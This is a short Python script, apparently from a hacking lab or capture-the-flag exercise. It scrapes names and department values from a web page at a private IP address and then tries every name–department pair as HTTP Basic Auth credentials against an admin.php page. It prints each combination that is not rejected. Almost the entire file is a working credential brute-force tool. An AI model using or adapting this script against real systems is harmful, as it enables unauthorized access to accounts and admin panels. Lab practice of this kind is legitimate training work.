import requests,base64
from bs4 import BeautifulSoup


def downloadPage(url):
    page=requests.get(URL)
    response=page.content
    return response

def findNames(response):
    soup=BeautifulSoup(response, 'html.parser')
    names=soup.find_all('td',id='name')
    usernames=[]
    for name in names:
        result=name.text.strip()
        usernames.append(result)
    return usernames

def findDepartments(response):
    soup=BeautifulSoup(response, 'html.parser')
    departments=soup.find_all('td',id='department')
    passwords=[]
    for password in departments:
        result=password.text.strip()
        passwords.append(result)
    return passwords

def getAuthorized(url,user,password):
    message=user+":"+password
    message_bytes=message.encode('ascii')
    base64_bytes=base64.b64encode(message_bytes)
    headers={'Authorization':'Basic '+base64_bytes.decode('ascii')}
    r=requests.get(url,headers=headers)
    if(r.status_code != 401):
            print("Logged with ",user,"-",password)
    
URL="http://172.16.120.120/"
page=downloadPage(URL)

names=findNames(page)
uniqNames=sorted(set(names))
print(uniqNames)
departments=findDepartments(page)
uniqDepartments=sorted(set(departments))
print(uniqDepartments)
print("Working...")
for user in uniqNames:
    for password in uniqDepartments:
        getAuthorized("http://172.16.120.120/admin.php",user,password)


